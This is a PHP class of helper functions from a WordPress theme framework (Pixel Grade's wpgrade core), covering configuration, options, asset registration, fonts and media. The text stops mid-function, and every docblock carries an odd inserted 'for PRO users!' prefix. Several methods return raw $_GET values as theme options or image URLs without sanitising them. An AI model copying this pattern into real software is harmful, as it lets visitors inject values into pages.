<?php

/*  for PRO users! -  This file is property of Pixel Grade Media. You may NOT copy, or redistribute
 * it. Please see the license that came with your copy for more information.
 */

/*  for PRO users! - *
 * @package        wpgrade
 * @category       functions
 * @author         Pixel Grade Team
 * @copyright  (c) 2013, Pixel Grade Media
 */
class wpgrade {

	#
	# This class is strictly meant to act as a function container to emulate
	# namespace behaviour. This avoids confusion and eliminates the risk of
	# injecting conflicting names.
	#
	# Shorthands for system classes should also be placed here.
	#
	# This is the ONLY place where functions that directly echo out content
	# should exist.
	#

	/*  for PRO users! - * @var array */
	protected static $configuration = null;

	/*  for PRO users! - *
	 * The theme configuration as read by the system is defined in
	 * wpgrade-config.php
	 * @deprecated
	 * @return array theme configuration
	 */
	static function config() {
		//		if (self::$configuration === null) {
		//			self::$configuration = include self::themepath().'wpgrade-config'.EXT;
		//		}
		//
		//		return self::$configuration;
		return self::get_config();
	}

	static function get_config() {
		if ( ! self::has_config() ) {
			self::set_config();
		}

		return self::$configuration;
	}

	static function set_config() {
		/*  for PRO users! - *
		 * this is the old path...keep it for legacy
		 */
		if ( file_exists( self::childpath() . 'config/wpgrade-config' . EXT ) ) {
			self::$configuration = include self::childpath() . 'config/wpgrade-config' . EXT;
		} elseif ( file_exists( self::themepath() . 'config/wpgrade-config' . EXT ) ) {
			self::$configuration = include self::themepath() . 'config/wpgrade-config' . EXT;
		} elseif ( file_exists( self::childpath() . 'wpgrade-config' . EXT ) ) {
			self::$configuration = include self::childpath() . 'wpgrade-config' . EXT;
		} elseif ( file_exists( self::themepath() . 'wpgrade-config' . EXT ) ) {
			self::$configuration = include self::themepath() . 'wpgrade-config' . EXT;
		}
	}

	static function has_config() {
		if ( self::$configuration === null ) {
			return false;
		}

		return true;
	}

	static $shortname = null;

	/*  for PRO users! - * @var WPGradeMeta wpgrade state information */
	protected static $state = null;

	protected static $customizer_options = null;

	/*  for PRO users! - *
	 * The state consists of variables set by the system, and used to pass data
	 * between different routines. eg. the update notifier
	 * @return WPGradeMeta current system state
	 */
	static function state() {
		if ( self::$state === null ) {
			self::$state = WPGradeMeta::instance( array() );
		}

		return self::$state;
	}

	/*  for PRO users! - *
	 * @return mixed
	 */
	static function confoption( $key, $default = null ) {
		$config = self::config();

		return isset( $config[ $key ] ) ? $config[ $key ] : $default;
	}

	/*  for PRO users! - *
	 * @return string theme textdomain
	 */
	static function textdomain() {
		$conf = self::config();
		if ( isset( $conf['textdomain'] ) && $conf['textdomain'] !== null ) {
			return $conf['textdomain'];
		} else { // no custom text domain, fallback to default pattern
			return $conf['name'] . '_txtd';
		}
	}

	/*  for PRO users! - *
	 * @return string http or https based on is_ssl()
	 */
	static function protocol() {
		return is_ssl() ? 'https' : 'http';
	}


	//// Options ///////////////////////////////////////////////////////////////////

	/*  for PRO users! - * @var WPGradeOptions */
	protected static $options_handler = null;

	/*  for PRO users! - *
	 * @param WPGradeOptions option driver manager
	 */
	static function options_handler( $options_handler ) {
		self::$options_handler = $options_handler;
	}

	/*  for PRO users! - *
	 * @return WPGradeOptions current options handler
	 */
	static function options() {
		return self::$options_handler;
	}

	/*  for PRO users! - *
	 * @return mixed
	 */
	static function option( $option, $default = null ) {
		global $pagenow;

		// if there is set an key in url force that value
		if ( isset( $_GET[ $option ] ) && ! empty( $option ) ) {

			return $_GET[ $option ];

		} elseif ( isset( $_POST['customized'] ) && self::customizer_option_exists( $option ) ) {
			// so we are on the customizer page
			// overwrite every option if we have one
			return self::get_customizer_option( $option );

		} else {
			return self::options()->get( $option, $default );
		}
	}

	/*  for PRO users! - *
	 * Get a redux config argument
	 * @param $arg
	 *
	 * @return bool
	 */
	static function get_redux_arg( $arg ) {
		$args = self::get_redux_args();

		if (!empty($arg) && isset($args[$arg]) ) {
			return $args[$arg];
		}
		return false;
	}

	static function get_redux_args() {
		return self::options()->get_args();
	}

	static function get_redux_sections() {
		return self::options()->get_sections();
	}

	static function get_redux_defaults() {
		return self::options()->get_defaults();
	}

	/*  for PRO users! - *
	 * Get the image src attribute.
	 * Target should be a valid option accessible via WPGradeOptions interface.
	 * @return string|false
	 */
	static function image_src( $target ) {
		if ( isset( $_GET[ $target ] ) && ! empty( $target ) ) {
			return $_GET[ $target ];
		} else { // empty target, or no query
			$image = self::option( $target, array() );
			if ( isset( $image['url'] ) ) {
				return $image['url'];
			}
		}

		return false;
	}

	/*  for PRO users! - *
	 * Get the image src
	 * [!!] Methods that retrieve a specific type of data and for which the
	 * $default would only cause an error (especially when set to null), should
	 * just be presented as an independent method even if they use the options
	 * interface under the hood. Presented it as part of the options interface
	 * will only cause confusion, unreadability and propagate nonsense.
	 * [!!] please replace instances of this method with wpgrade::image_src
	 * @deprecated
	 * @return mixed
	 */
	static function option_image_src( $option, $default = null ) {
		if ( isset( $_GET[ $option ] ) && ! empty( $option ) ) {
			return $_GET[ $option ];
		} else {
			$image = self::options()->get( $option, $default );

			if ( isset( $image['url'] ) ) {
				return $image['url'];
			}
		}

		return false;
	}

	/*  for PRO users! - *
	 * Shorthand.
	 * Please try using wpgrade::options()->set instead, it's clearer.
	 * @return WPGradeOptions
	 */
	static function setoption( $option, $value ) {
		return self::options()->set( $option, $value );
	}

	/*  for PRO users! - *
	 * [!!] The method wording makes no sense in English. It's not retrieving a
	 * set of items. Please replace instances of this method with either,
	 *        wpgrade::options()->set
	 * or
	 *        wpgrade::setoption
	 * @deprecated
	 */
	static function option_set( $option, $value ) {
		return self::setoptions( $option, $value );
	}


	//// Resolvers /////////////////////////////////////////////////////////////////

	/*  for PRO users! - * @var array */
	protected static $resolvers = array();

	/*  for PRO users! - *
	 * The point of a resolver is to deal with various anti-pattern adopted by
	 * sadly quite a few wordpress specific plugins and frameworks. The pattern
	 * offers an alternative to techniques such as globals and mitigates the
	 * use of various "god object" patterns (generally manifesting themselves
	 * as classes that do their work in the damn constructor, and other
	 * singleton-ish patterns).
	 *
	 * @param string   key by which to invoke the resolver
	 * @param callable callback function
	 */
	static function register_resolver( $key, $callback_function ) {
		self::$resolvers[ $key ] = $callback_function;
	}

	/*  for PRO users! - *
	 * A previously registered resolver is invoked and the relevant key is
	 * removed to prevent double invokation since the use of resolves means
	 * dangerous code is involved.
	 * The function will gracefully do nothing when multiple calls do occur.
	 * Though this does little but prevent local damage.
	 *
	 * @param string resolver key
	 * @param mixed  configuration to passs to resolver
	 */
	static function resolve( $key, $conf ) {
		if ( isset( self::$resolvers[ $key ] ) ) {
			call_user_func_array( self::$resolvers[ $key ], array( $conf ) );
		}
	}


	//// Wordpress Defferred Helpers ///////////////////////////////////////////////

	/*  for PRO users! - *
	 * Filter content based on settings in wpgrade-config.php
	 * Filters may be disabled by setting priority to false or null.
	 * @return string $content after being filtered
	 */
	static function filter_content( $content, $filtergroup ) {
		$config = self::config();

		if ( ! isset( $config['content-filters'] ) || ! isset( $config['content-filters'][ $filtergroup ] ) ) {
			return $content;
		}

		$enabled_filters = array();
		foreach ( $config['content-filters'][ $filtergroup ] as $filterfunc => $priority ) {
			if ( $priority !== false && $priority !== null ) {
				$enabled_filters[ $filterfunc ] = $priority;
			}
		}

		asort( $enabled_filters );

		foreach ( $enabled_filters as $filterfunc => $priority ) {
			$content = call_user_func( $filterfunc, $content );
		}

		return $content;
	}

	/*  for PRO users! - *
	 * @param type $content
	 */
	static function display_content( $content, $filtergroup = null ) {
		$filtergroup !== null or $filtergroup = 'default';
		echo self::filter_content( $content, $filtergroup );
	}

	/*  for PRO users! - *
	 * @return string template path WITH TRAILING SLASH
	 */
	static function themepath() {
		return get_template_directory() . DIRECTORY_SEPARATOR;
	}

	/*  for PRO users! - *
	 * @return string theme path (it may be a child theme) WITH TRAILING SLASH
	 */
	static function childpath() {
		return get_stylesheet_directory() . DIRECTORY_SEPARATOR;
	}

	/*  for PRO users! - *
	 * @return string path to core with slash
	 */
	static function corepath() {
		return dirname( __FILE__ ) . DIRECTORY_SEPARATOR;
	}

	/*  for PRO users! - *
	 * @return string core uri path
	 */
	static function coreuri() {
		return get_template_directory_uri() . '/' . basename( dirname( __FILE__ ) ) . '/';
	}

	/*  for PRO users! - *
	 * @return string resource uri
	 */
	static function coreresourceuri( $file ) {
		return self::coreuri() . 'resources/assets/' . $file;
	}

	/*  for PRO users! - *
	 * @return string file path
	 */
	static function themefilepath( $file ) {
		return self::themepath() . $file;
	}

	/*  for PRO users! - *
	 * @return string path
	 */
	static function corepartial( $file ) {

		$templatepath = self::themepath() . rtrim( self::confoption( 'core-partials-overwrite-path', 'theme-partials/wpgrade-partials' ), '/' ) . '/' . $file;
		$childpath    = self::childpath() . rtrim( self::confoption( 'core-partials-overwrite-path', 'theme-partials/wpgrade-partials' ), '/' ) . '/' . $file;

		if ( file_exists( $childpath ) ) {
			return $childpath;
		} elseif ( file_exists( $templatepath ) ) {
			return $templatepath;
		} else { // local file not available
			return self::corepath() . 'resources/views/' . $file;
		}
	}

	/*  for PRO users! - *
	 * This method uses wpgrade::corepartial to determine the path.
	 * @return string contents of partial at the computed path
	 */
	static function coreview( $file, $__include_parameters = array() ) {
		extract( $__include_parameters );
		ob_start();
		include wpgrade::corepartial( $file );

		return ob_get_clean();
	}

	/*  for PRO users! - *
	 * @return string the lowercase version of the name
	 */
	static function shortname() {
		return self::get_shortname();
	}

	static function get_shortname() {
		if ( self::$shortname === null ) {
			$config = self::get_config();
			if ( isset( $config['shortname'] ) ) {
				self::$shortname = $config['shortname'];
			} else { // use name to determine apropriate shortname
				self::$shortname = str_replace( ' ', '_', strtolower( $config['name'] ) );
			}
		}

		return self::$shortname;
	}

	/*  for PRO users! - *
	 * @return string theme prefix
	 */
	static function prefix() {
		$config = self::config();
		if ( isset( $config['prefix'] ) ) {
			return $config['prefix'];
		} else { // use shortname to determine apropriate shortname
			return '_' . self::shortname() . '_';
		}
	}

	/*  for PRO users! - *
	 * @return string theme name, in presentable format
	 */
	static function themename() {
		$config = self::config();

		return ucfirst( $config['name'] );
	}

	/*  for PRO users! - * @var WP_Theme */
	protected static $theme_data = null;

	/*  for PRO users! - *
	 * @return WP_Theme
	 */
	static function themedata() {
		if ( self::$theme_data === null ) {
			if ( is_child_theme() ) {
				$theme_name       = get_template();
				self::$theme_data = wp_get_theme( $theme_name );
			} else {
				self::$theme_data = wp_get_theme();
			}
		}

		return self::$theme_data;
	}

	/*  for PRO users! - *
	 * @return string
	 */
	static function themeversion() {
		return wpgrade::themedata()->Version;
	}

	/*  for PRO users! - *
	 * @return string
	 */
	static function template_folder() {
		return wpgrade::themedata()->Template;
	}

	/*  for PRO users! - *
	 * Reads theme configuration and returns resolved classes.
	 * @return array|boolean classes or false
	 */
	static function body_class() {
		$config = self::config();

		if ( ! empty( $config['body-classes'] ) ) {
			$classes          = array();
			$handlers_results = array();
			foreach ( $config['body-classes'] as $classname => $resolution ) {
				if ( is_string( $resolution ) ) {
					// ensure handler is executed; and only executed once
					if ( ! isset( $handlers_results[ $resolution ] ) ) {
						$handlers_results[ $resolution ] = call_user_func( $resolution );
					}
					// process result of handler
					if ( $handlers_results[ $resolution ] ) {
						$classes[] = $classname;
					}
				} else { // assume boolean
					if ( $resolution ) {
						$classes[] = $classname;
					}
				}
			}

			return $classes;
		} else { // no body class handlers
			return null;
		}
	}

	/*  for PRO users! - *
	 * @return string uri to file
	 */
	static function uri( $file ) {
		$file = '/' . ltrim( $file, '/' );

		return get_template_directory_uri() . $file;
	}

	/*  for PRO users! - *
	 * @return string uri to resource file
	 */
	static function resourceuri( $file ) {
		return wpgrade::uri( wpgrade::confoption( 'resource-path', 'theme-content' ) . '/' . ltrim( $file, '/' ) );
	}

	/*  for PRO users! - *
	 * @return string
	 */
	static function pagination( $query = null, $target = null ) {
		if ( $query === null ) {
			global $wp_query;
			$query = $wp_query;
		}

		$target_settings = null;
		if ( $target !== null ) {
			$targets = self::confoption( 'pagination-targets', array() );
			if ( isset( $targets[ $target ] ) ) {
				$target_settings = $targets[ $target ];
			}
		}

		$pager = new WPGradePaginationFormatter( $query, $target_settings );

		return $pager->render();
	}


	//// Helpers ///////////////////////////////////////////////////////////////////

	/*  for PRO users! - *
	 * Hirarchical array merge. Will always return an array.
	 *
	 * @param  ... arrays
	 *
	 * @return array
	 */
	static function merge() {
		$base = array();
		$args = func_get_args();

		foreach ( $args as $arg ) {
			self::array_merge( $base, $arg );
		}

		return $base;
	}

	/*  for PRO users! - *
	 * Overwrites base array with overwrite array.
	 *
	 * @param array base
	 * @param array overwrite
	 */
	protected static function array_merge( array &$base, array $overwrite ) {
		foreach ( $overwrite as $key => &$value ) {
			if ( is_int( $key ) ) {
				// add only if it doesn't exist
				if ( ! in_array( $overwrite[ $key ], $base ) ) {
					$base[] = $overwrite[ $key ];
				}
			} else if ( is_array( $value ) ) {
				if ( isset( $base[ $key ] ) && is_array( $base[ $key ] ) ) {
					self::array_merge( $base[ $key ], $value );
				} else { // does not exist or it's a non-array
					$base[ $key ] = $value;
				}
			} else { // not an array and not numeric key
				$base[ $key ] = $value;
			}
		}
	}

	/*  for PRO users! - *
	 * Recursively finds all files in a directory.
	 *
	 * @param string directory to search
	 *
	 * @return array found files
	 */
	static function find_files( $dir ) {
		$found_files = array();
		$files       = scandir( $dir );

		foreach ( $files as $value ) {
			// skip special dot files
			// and any file that starts with a . - think hidden directories like .svn or .git
			if ( strpos( $value, '.' ) === 0 ) {
				continue;
			}

			// is it a file?
			if ( is_file( "$dir/$value" ) ) {
				$found_files[] = "$dir/$value";
				continue;
			} else { // it's a directory
				foreach ( self::find_files( "$dir/$value" ) as $value ) {
					$found_files[] = $value;
				}
			}
		}

		return $found_files;
	}

	/*  for PRO users! - *
	 * Requires all PHP files in a directory.
	 * Use case: callback directory, removes the need to manage callbacks.
	 * Should be used on a small directory chunks with no sub directories to
	 * keep code clear.
	 *
	 * @param string path
	 */
	static function require_all( $path ) {

		$files = self::find_files( rtrim( $path, '\\/' ) );

		$priority_list = array();
		foreach ( $files as $file ) {
			$priority_list[ $file ] = self::file_priority( $file );
		}

		asort( $priority_list, SORT_ASC );

		foreach ( $priority_list as $file => $priority ) {
			if ( strpos( $file, EXT ) ) {

				// we need to prepare the get_template_part param
				// which should be a relative path but without the extension
				// like "wpgrade-core/hooks"

				// first time test if this is a linux based server path with backslash
				$file = explode( 'themes/'. self::template_folder(), $file);
				if ( isset( $file[1] ) ) {
					$file = $file[1];
				} else { // if not it must be a windows path with slash
					$file = explode( 'themes\\'. self::template_folder(), $file[0]);
					if ( isset( $file[1] ) ) {
						$file = $file[1];
					}
				}
				$file = str_replace( EXT, '', $file  );
			}

			get_template_part($file) ;
		}
	}

	/*  for PRO users! - *
	 * Priority based on path length and number of directories. Files in the
	 * same directory have higher priority if their path is shorter; files in
	 * directories have +100 priority bonus for every directory.
	 *
	 * @param  string file path
	 *
	 * @return int
	 */
	protected static function file_priority( $path ) {
		$path = str_replace( '\\', '/', $path );

		return strlen( $path ) + substr_count( $path, '/' ) * 100;
	}

	/*  for PRO users! - *
	 * Helper function for safely calculating cachebust string. The filemtime is
	 * prone to failure.
	 *
	 * @param  string file path to test
	 *
	 * @return string cache bust based on filemtime or monthly
	 */
	static function cachebust_string( $filepath ) {
		$filemtime = @filemtime( $filepath );

		if ( $filemtime == null ) {
			$filemtime = @filemtime( utf8_decode( $filepath ) );
		}

		if ( $filemtime != null ) {
			return date( 'YmdHi', $filemtime );
		} else { // can't get filemtime, fallback to cachebust every month
			return date( 'Ym' );
		}
	}

	/*  for PRO users! - *
	 * Helper for registering scripts based on a wpgrade configuration pattern.
	 * Used in wpgrade-system/hook for reading wpgrade-config values
	 *
	 * @param array   scripts
	 * @param boolean place scripts in footer?
	 */
	protected static function register_scripts( $scripts, $in_footer ) {
		foreach ( $scripts as $scriptname => $conf ) {
			// the child theme may be allowed to overwrite the configuration in
			// which case we support for null configuration, ie. child theme turned
			// the resource off
			if ( $conf !== null ) {
				if ( is_string( $conf ) ) {
					$path       = $conf;
					$require    = array();
					$cache_bust = '';

				} else { // array configuration passed
					$path = $conf['path'];

					// compute requirements
					if ( isset( $conf['require'] ) ) {
						if ( is_string( $conf['require'] ) ) {
							$require = array( $conf['require'] );
						} else { // assume array
							$require = $conf['require'];
						}
					} else { // no dependencies
						$require = array();
					}

					// compute cache bust
					if ( isset( $conf['cache_bust'] ) ) {
						$cache_bust = $conf['cache_bust'];
					} else { // no cache bust
						$cache_bust = '';
					}
				}

				wp_register_script( $scriptname, $path, $require, $cache_bust, $in_footer );
			}
		}
	}

	/*  for PRO users! - *
	 * Helper for registering scripts based on a wpgrade configuration pattern.
	 * Used in wpgrade-system/hook for reading wpgrade-config values
	 *
	 * @param array footer scripts
	 */
	static function register_head_scripts( $scripts ) {
		self::register_scripts( $scripts, false );
	}

	/*  for PRO users! - *
	 * Helper for registering scripts based on a wpgrade configuration pattern.
	 * Used in wpgrade-system/hook for reading wpgrade-config values
	 *
	 * @param array footer scripts
	 */
	static function register_footer_scripts( $scripts ) {
		self::register_scripts( $scripts, true );
	}

	/*  for PRO users! - *
	 * Helper for registering styles based on a wpgrade configuration pattern.
	 * Used in wpgrade-system/hook for reading wpgrade-config values
	 *
	 * @param array styles
	 */
	static function register_styles( $styles ) {
		foreach ( $styles as $stylename => $conf ) {
			// the child theme may be allowed to overwrite the configuration in
			// which case we support for null configuration, ie. child theme turned
			// the resource off
			if ( $conf !== null ) {
				if ( is_string( $conf ) ) {
					$path       = $conf;
					$require    = array();
					$cache_bust = '';
					$media      = 'all';
				} else { // array configuration passed
					$path = $conf['path'];

					// compute requirements
					if ( isset( $conf['require'] ) ) {
						if ( is_string( $conf['require'] ) ) {
							$require = array( $conf['require'] );
						} else { // assume array
							$require = $conf['require'];
						}
					} else { // no dependencies
						$require = array();
					}

					// compute cache bust
					if ( isset( $conf['cache_bust'] ) ) {
						$cache_bust = $conf['cache_bust'];
					} else { // no cache bust
						$cache_bust = '';
					}

					// compute media
					if ( isset( $conf['media'] ) ) {
						$media = $conf['media'];
					} else { // no media
						$media = 'all';
					}
				}

				wp_register_style( $stylename, $path, $require, $cache_bust, $media );
			}
		}
	}

	/*  for PRO users! - *
	 * @param string font
	 *
	 * @return array values for the font
	 */
	static function get_the_typo( $font ) {
		if ( self::option( $font ) ) {
			return self::option( $font );
		}

		return false;
	}

	/*  for PRO users! - *
	 * @param string font
	 *
	 * @return string css value for the font
	 */
	static function get_font_name( $font ) {

		if ( self::option( $font ) ) {
			$thefont = self::option( $font );

			if ( isset( $thefont['font-family'] ) ) {
				return $thefont['font-family'];
			}
		}

		return '';
	}

	/*  for PRO users! - *
	 * @param string font
	 *
	 * @return string css value for a google font
	 */
	static function get_google_font_name( $font ) {

		$returnString = '';

		$thefont = self::option( $font );

		if ( ! empty( $thefont ) && ( isset( $thefont['google'] ) && $thefont['google'] ) ) {
			if ( ! empty( $thefont['font-family'] ) ) {
				$returnString = $thefont['font-family'];

				//put in the font weight
				if ( ! empty( $thefont['font-weight'] ) ) {
					$returnString .= ':' . $thefont['font-weight'];
				} else if ( ! empty( $thefont['subsets'] ) ) {
					//still needs the : so it will skip this when using subsets
					$returnString .= ':';
				}

				if ( ! empty( $thefont['subsets'] ) ) {
					$returnString .= ':' . $thefont['subsets'];
				}
			}
		}

		return $returnString;
	}

	static function display_font_params( $font_args = array() ) {

		if ( empty( $font_args ) ) {
			return;
		}

		if ( isset( $font_args['font-family'] ) && ! empty( $font_args['font-family'] ) ) {
			echo 'font-family: ' . $font_args['font-family'] . ";\n\t";
		}

		if ( isset( $font_args['font-weight'] ) && ! empty( $font_args['font-weight'] ) ) {
			echo 'font-weight: ' . $font_args['font-weight'] . ";\n\t";
		}

		if ( isset( $font_args['font-size'] ) && ! empty( $font_args['font-size'] ) ) {
			echo 'font-size: ' . $font_args['font-size'] . ";\n\t";
		}

		if ( isset( $font_args['font-style'] ) && ! empty( $font_args['font-style'] ) ) {
			echo 'font-style: ' . $font_args['font-style'] . ";\n\t";
		}

		if ( isset( $font_args['line-height'] ) && ! empty( $font_args['line-height'] ) ) {
			echo 'line-height: ' . $font_args['line-height'] . ";\n\t";
		}

		if ( isset( $font_args['color'] ) && ! empty( $font_args['color'] ) ) {
			echo 'color: ' . $font_args['color'] . ";\n\t";
		}
	}

	/*  for PRO users! - *
	 * @param string font
	 *
	 * @return string css value for the font
	 * @depricated since 3.2.1
	 */
	static function css_friendly_font( $font ) {
		$thefont = explode( ":", str_replace( "+", " ", self::option( $font ) ) );

		return $thefont[0];
	}

	/*  for PRO users! - *
	 * @param string hex
	 *
	 * @return array rgb
	 */
	static function hex2rgb_array( $hex ) {
		$hex = str_replace( '#', '', $hex );

		if ( strlen( $hex ) == 3 ) {
			$r = hexdec( substr( $hex, 0, 1 ) . substr( $hex, 0, 1 ) );
			$g = hexdec( substr( $hex, 1, 1 ) . substr( $hex, 1, 1 ) );
			$b = hexdec( substr( $hex, 2, 1 ) . substr( $hex, 2, 1 ) );
		} else { // strlen($hex) != 3
			$r = hexdec( substr( $hex, 0, 2 ) );
			$g = hexdec( substr( $hex, 2, 2 ) );
			$b = hexdec( substr( $hex, 4, 2 ) );
		}

		$rgb = array( $r, $g, $b );

		return $rgb; // returns an array with the rgb values
	}


	// Upgrade Notifier
	// ------------------------------------------------------------------------

	/*  for PRO users! - *
	 * @return string xml file url
	 */
	static function updade_notifier_xml() {
		$config   = self::config();
		$notifier = $config['update-notifier'];

		$baseurl = rtrim( $notifier['xml-source'], '/' ) . '/';

		if ( isset( $notifier['xml-file'] ) ) {
			$xmlfile = $notifier['xml-file'];
		} else { // no custom xml filename specified
			$xmlfile = self::shortname() . '.xml';
		}

		return $baseurl . $xmlfile;
	}

	/*  for PRO users! - *
	 * @return int seconds
	 */
	static function update_notifier_cacheinterval() {
		$config   = self::config();
		$notifier = $config['update-notifier'];

		return $notifier['cache-interval'];
	}

	/*  for PRO users! - *
	 * @return string
	 */
	static function update_notifier_pagename() {
		$config   = self::config();
		$notifier = $config['update-notifier'];

		return $notifier['update-page-name'];
	}


	//// Media Handlers & Helpers //////////////////////////////////////////////////

	#
	# Audio
	#

	/*  for PRO users! - *
	 * ...
	 */
	static function audio_selfhosted( $postID ) {
		$audio_mp3    = get_post_meta( $postID, wpgrade::prefix() . 'audio_mp3', true );
		$audio_m4a    = get_post_meta( $postID, wpgrade::prefix() . 'audio_m4a', true );
		$audio_oga    = get_post_meta( $postID, wpgrade::prefix() . 'audio_ogg', true );
		$audio_poster = get_post_meta( $postID, wpgrade::prefix() . 'audio_poster', true );

		include wpgrade::corepartial( 'audio-selfhosted' . EXT );
	}

	#
	# Video
	#

	/*  for PRO users! - *
	 * ...
	 */
	static function video_selfhosted( $postID ) {
		$video_m4v    = get_post_meta( $postID, wpgrade::prefix() . 'video_m4v', true );
		$video_webm   = get_post_meta( $postID, wpgrade::prefix() . 'video_webm', true );
		$video_ogv    = get_post_meta( $postID, wpgrade::prefix() . 'video_ogv', true );
		$video_poster = get_post_meta( $postID, wpgrade::prefix() . 'video_poster', true );

		include wpgrade::corepartial( 'video-selfhosted' . EXT );
	}

	/*  for PRO users! - *
	 * Given a video link returns an array containing the matched services and
	 * the corresponding video id.
	 * @return array (youtube, vimeo) id hash if matched
	 */
	static function post_videos_id( $post_id ) {
		$result = array();

		$vembed   = get_post_meta( $post_id, wpgrade::prefix() . 'vimeo_link', true );
		$vmatches = null;
		if ( preg_match( '#(src=\"[^0-9]*)?vimeo\.com/(video/)?(?P<id>[0-9]+)([^\"]*\"|$)#', $vembed, $vmatches ) ) {
			$result['vimeo'] = $vmatches["id"];
		}

		$yembed   = get_post_meta( $post_id, wpgrade::prefix() . 'youtube_id', true );
		$ymatches = null;
		if ( preg_match( '/^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=)(?P<id>[^#\&\?\"]*).*/', $yembed, $ymatches ) ) {
			$result['youtube'] = $ymatches["id"];
		}

		return $result;
	}

	#
	# Gallery
	#

	/*  for PRO users! - *
	 * Extract the fist image in the content.
	 */
	static function post_first_image() {
		global $post, $posts;
		$first_img = '';
		preg_match_all( '/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches );
		$first_img = $matches[1][0];

		// define a default image
		if ( empty( $first_img ) ) {
			$first_img = "";
		}

		return $first_img;
	}


	//// Internal Bootstrapping Helpers ////////////////////////////////////////////

	/*  for PRO users! - *
	 * Loads in core dependency.
	 */
	static function require_coremodule( $modulename ) {

		if ( $modulename == 'redux2' ) {
			require self::corepath() . 'vendor/redux2/options/defaults' . EXT;
		} elseif ( $modulename == 'redux3' ) {
			get_template_part( 'wpgrade-core/vendor/redux3/framework' );
		} else { // unsupported module
			die( 'Unsuported core module: ' . $modulename );
		}
	}

	/*  for PRO users! - *
	 * @return string partial uri path to core module
	 */
	static function coremoduleuri( $modulename ) {
		if ( $modulename == 'redux2' ) {
			return wpgrade::coreuri() . 'vendor/redux2/';
		} elseif ( $modulename == 'redux3' ) {
			return wpgrade::coreuri() . 'vendor/redux3/';
		} else { // unsupported module
			die( 'Unsuported core module: ' . $modulename );
		}
	}


	//// WPML Related Functions ////////////////////////////////////////////////////

	static function lang_post_id( $id ) {
		if ( function_exists( 'icl_object_id' ) ) {
			global $post;
			// make this work for any post type
			if ( isset( $post->post_type ) ) {
				$post_type = $post->post_type;
			} else {
				$post_type = 'post';
			}

			return icl_object_id( $id, $post_type, true );
		} else {
			return $id;
		}
	}

	static function lang_page_id( $id ) {
		if ( function_exists( 'icl_object_id' ) ) {
			return icl_object_id( $id, 'page', true );
		} else {
			return $id;
		}
	}

	static function lang_category_id( $id ) {
		if ( function_exists( 'icl_object_id' ) ) {
			return icl_object_id( $id, 'category', true );
		} else {
			return $id;
		}
	}

	// a dream
	static function lang_portfolio_tax_id( $id ) {
		if ( function_exists( 'icl_object_id' ) ) {
			return icl_object_id( $id, 'portfolio_cat', true );
		} else {
			return $id;
		}
	}

	static function lang_post_tag_id( $id ) {
		if ( function_exists( 'icl_object_id' ) ) {
			return icl_object_id( $id, 'post_tag', true );
		} else {
			return $id;
		}
	}

	static function lang_original_post_id( $id ) {
		if ( function_exists( 'icl_object_id' ) ) {
			global $post;

			// make this work with custom post types
			if ( isset( $post->post_type ) ) {
				$post_type = $post->post_type;
			} else {
				$post_type = 'post';
			}

			return icl_object_id( $id, $post_type, true, self::get_short_defaultwp_language() );
		} else {
			return $id;
		}
	}

	static function get_short_defaultwp_language() {
		global $sitepress;
		if ( isset( $sitepress ) ) {
			return $sitepress->get_default_language();
		} else {
			return substr( get_bloginfo( 'language' ), 0, 2 );
		}
	}

	//// Unit Test Helpers /////////////////////////////////////////////////////////

	/*  for PRO users! - *
	 * This method is mainly used in testing.
	 */
	static function overwrite_configuration( $conf ) {
		if ( $conf !== null ) {
			$current_config      = self::config();
			self::$configuration = array_merge( $current_config, $conf );
		} else { // null passed; delete configuration
			self::$configuration = null;
		}
	}

	//// Behavior Testing Helpers //////////////////////////////////////////////////

	/*  for PRO users! - *
	 * This method is used to return the base path to the wordpress test
	 * instance.
	 */
	static function features_testurl() {
		$feature_test_path   = self::corepath() . 'features/.test.path';
		$theme_features_path = self::corepath() . '../.test.path';
		if ( file_exists( $feature_test_path ) ) {
			$path = file_get_contents( $feature_test_path );
			$path = trim( $path );

			return rtrim( $path, '/' ) . '/';
		} else if ( file_exists( $theme_features_path ) ) {
			$path = file_get_contents( $theme_features_path );
			$path = trim( $path );

			return rtrim( $path, '/' ) . '/';
		} else { # the file does not exist
			throw new Exception( 'Please create the file wpgrade-core/features/.test.path and place the url to your wordpress inside it.' );
		}
	}

	// == Customizer overridden helpers ==

	/*  for PRO users! - *
	 * Check if an option exists in customizer's post
	 *
	 * @param $option
	 *
	 * @return bool
	 */
	static function customizer_option_exists( $option ) {

		// cache this json so we don't scramble it every time
		if ( ! self::has_customizer_options() && isset( $_POST['customized'] ) ) {
			self::set_customizer_options( $_POST['customized'] );
		}
		$options = self::get_customizer_options();
		if ( isset( $options[ $option ] ) ) {
			return true;
		}

		return false;
	}

	/*  for PRO users! - *
	 * Get an options from our static customizer options array
	 *
	 * @param $option
	 *
	 * @return mixed
	 */
	static function get_customizer_option( $option ) {
		$options = self::get_customizer_options();

		return $options[ $option ];
	}

	/*  for PRO users! - *
	 * Check we we have cached our customizer options
	 * @return bool
	 */
	static function has_customizer_options() {
		if ( ! empty( self::$customizer_options ) ) {
			return true;
		}

		return false;
	}

	/*  for PRO users! - *
	 * Get our static customizer options or false if they don't exist
	 * @return bool|null
	 */
	static function get_customizer_options() {
		if ( ! empty( self::$customizer_options ) ) {
			return self::$customizer_options;
		}

		return false;
	}

	/*  for PRO users! - *
	 * Cache the customizer's options in a static array (converted from an given json)
	 *
	 * @param $json
	 */
	static function set_customizer_options( $json ) {
		if ( empty( self::$customizer_options ) ) {
			$options = json_decode( wp_unslash( $json ), true );

			$theme_key = self::shortname() . '_options';

			$options[ $theme_key ] = array();
			foreach ( $options as $key => $opt ) {
				$new_key = '';
				if ( stripos( $key, $theme_key ) === 0 && stripos( $key, $theme_key ) !== false ) {
					$new_key                           = str_replace( $theme_key . '[', '', $key );
					$new_key                           = rtrim( $new_key, ']' );
					$options[ $theme_key ][ $new_key ] = $opt;
				}
			}
			self::$customizer_options = $options[ $theme_key ];
		}
	}

	static function display_dynamic_css_rule( $rule, $key, $option_value, $important = false ) {

		if ( isset( $rule['media'] ) ) {
			echo '@media ' . $rule['media'] . " {\n";
		}

		if ( $important ) {
			$important = ' !important';
		} else {
			$important = '';
		}

		if ( isset( $rule['unit'] ) ) {
			$option_value .= $rule['unit'];
		}

		if ( isset( $rule['selector'] ) ) {
			echo $rule['selector'] . " {\n";
			echo "\t" . $key . ": " . $option_value . $important . "; \n";
			echo "\n}\n";
		}

		if ( isset( $rule['negative_selector'] ) ) {
